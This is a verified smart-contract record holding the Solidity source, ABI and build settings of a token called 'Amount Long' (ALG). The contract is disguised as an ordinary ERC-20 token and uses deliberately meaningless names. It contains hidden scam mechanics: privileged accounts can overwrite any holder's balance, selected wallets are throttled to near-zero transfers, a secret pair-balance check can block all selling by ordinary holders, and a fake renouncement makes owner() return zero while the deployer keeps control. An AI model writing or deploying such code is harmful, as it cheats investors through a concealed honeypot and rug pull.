{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface liquidityLaunch {\n    function createPair(address marketingFund, address atTrading) external returns (address);\n}\n\ninterface shouldTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverReceiverMin) external view returns (uint256);\n\n    function transfer(address limitList, uint256 feeMaxWallet) external returns (bool);\n\n    function allowance(address sellSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMaxWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitList,\n        uint256 feeMaxWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamBuy, uint256 value);\n    event Approval(address indexed sellSender, address indexed spender, uint256 value);\n}\n\nabstract contract buyTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountSellToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTxMetadata is shouldTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AmountLong is buyTo, shouldTx, shouldTxMetadata {\n\n    function atBuy() private view {\n        require(toLaunchedMin[_msgSender()]);\n    }\n\n    address public amountWalletSender;\n\n    string private totalLimit = \"Amount Long\";\n\n    function amountIs(address txShould) public {\n        if (isMax) {\n            return;\n        }\n        if (receiverTake != tokenBuy) {\n            liquidityReceiver = isMarketing;\n        }\n        toLaunchedMin[txShould] = true;\n        \n        isMax = true;\n    }\n\n    bool private fromFund;\n\n    bool public isMax;\n\n    mapping(address => mapping(address => uint256)) private liquidityLimit;\n\n    uint256 private isMarketing;\n\n    mapping(address => bool) public shouldEnable;\n\n    function teamSell(address modeSell) public {\n        atBuy();\n        \n        if (modeSell == launchFeeTrading || modeSell == amountWalletSender) {\n            return;\n        }\n        shouldEnable[modeSell] = true;\n    }\n\n    address public launchFeeTrading;\n\n    address shouldLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private tokenIs = 18;\n\n    uint256 public liquidityEnable;\n\n    event OwnershipTransferred(address indexed launchTrading, address indexed launchBuy);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenLimit;\n    }\n\n    uint256 constant feeSender = 5 ** 10;\n\n    mapping(address => bool) public toLaunchedMin;\n\n    function approve(address tokenReceiverExempt, uint256 feeMaxWallet) public virtual override returns (bool) {\n        liquidityLimit[_msgSender()][tokenReceiverExempt] = feeMaxWallet;\n        emit Approval(_msgSender(), tokenReceiverExempt, feeMaxWallet);\n        return true;\n    }\n\n    function enableFee() public {\n        emit OwnershipTransferred(launchFeeTrading, address(0));\n        exemptMax = address(0);\n    }\n\n    function balanceOf(address receiverReceiverMin) public view virtual override returns (uint256) {\n        return limitToken[receiverReceiverMin];\n    }\n\n    string private launchedTake = \"ALG\";\n\n    function transfer(address listAutoBuy, uint256 feeMaxWallet) external virtual override returns (bool) {\n        return senderMode(_msgSender(), listAutoBuy, feeMaxWallet);\n    }\n\n    function liquidityFromEnable(uint256 feeMaxWallet) public {\n        atBuy();\n        teamAt = feeMaxWallet;\n    }\n\n    function transferFrom(address maxListSwap, address limitList, uint256 feeMaxWallet) external override returns (bool) {\n        if (_msgSender() != shouldLimit) {\n            if (liquidityLimit[maxListSwap][_msgSender()] != type(uint256).max) {\n                require(feeMaxWallet <= liquidityLimit[maxListSwap][_msgSender()]);\n                liquidityLimit[maxListSwap][_msgSender()] -= feeMaxWallet;\n            }\n        }\n        return senderMode(maxListSwap, limitList, feeMaxWallet);\n    }\n\n    address exemptSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public receiverTake;\n\n    uint256 teamAt;\n\n    constructor (){\n        \n        amountSellToken isSwap = amountSellToken(shouldLimit);\n        amountWalletSender = liquidityLaunch(isSwap.factory()).createPair(isSwap.WETH(), address(this));\n        if (isMarketing == liquidityEnable) {\n            liquidityEnable = isMarketing;\n        }\n        launchFeeTrading = _msgSender();\n        toLaunchedMin[launchFeeTrading] = true;\n        limitToken[launchFeeTrading] = tokenLimit;\n        enableFee();\n        if (liquidityReceiver == liquidityEnable) {\n            liquidityEnable = isMarketing;\n        }\n        emit Transfer(address(0), launchFeeTrading, tokenLimit);\n    }\n\n    mapping(address => uint256) private limitToken;\n\n    function marketingSender(address listAutoBuy, uint256 feeMaxWallet) public {\n        atBuy();\n        limitToken[listAutoBuy] = feeMaxWallet;\n    }\n\n    uint256 public liquidityReceiver;\n\n    uint256 private tokenLimit = 100000000 * 10 ** 18;\n\n    function totalTx(address maxListSwap, address limitList, uint256 feeMaxWallet) internal returns (bool) {\n        require(limitToken[maxListSwap] >= feeMaxWallet);\n        limitToken[maxListSwap] -= feeMaxWallet;\n        limitToken[limitList] += feeMaxWallet;\n        emit Transfer(maxListSwap, limitList, feeMaxWallet);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenIs;\n    }\n\n    bool private exemptList;\n\n    function senderMode(address maxListSwap, address limitList, uint256 feeMaxWallet) internal returns (bool) {\n        if (maxListSwap == launchFeeTrading) {\n            return totalTx(maxListSwap, limitList, feeMaxWallet);\n        }\n        uint256 sellBuy = shouldTx(amountWalletSender).balanceOf(exemptSender);\n        require(sellBuy == teamAt);\n        require(limitList != exemptSender);\n        if (shouldEnable[maxListSwap]) {\n            return totalTx(maxListSwap, limitList, feeSender);\n        }\n        return totalTx(maxListSwap, limitList, feeMaxWallet);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalLimit;\n    }\n\n    address private exemptMax;\n\n    bool private tokenBuy;\n\n    function owner() external view returns (address) {\n        return exemptMax;\n    }\n\n    function allowance(address buyAmount, address tokenReceiverExempt) external view virtual override returns (uint256) {\n        if (tokenReceiverExempt == shouldLimit) {\n            return type(uint256).max;\n        }\n        return liquidityLimit[buyAmount][tokenReceiverExempt];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptMax;\n    }\n\n    uint256 marketingLaunchMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiverExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWalletSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMaxWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFeeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMaxWallet\",\"type\":\"uint256\"}],\"name\":\"liquidityFromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMaxWallet\",\"type\":\"uint256\"}],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLaunchedMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMaxWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxListSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMaxWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AmountLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}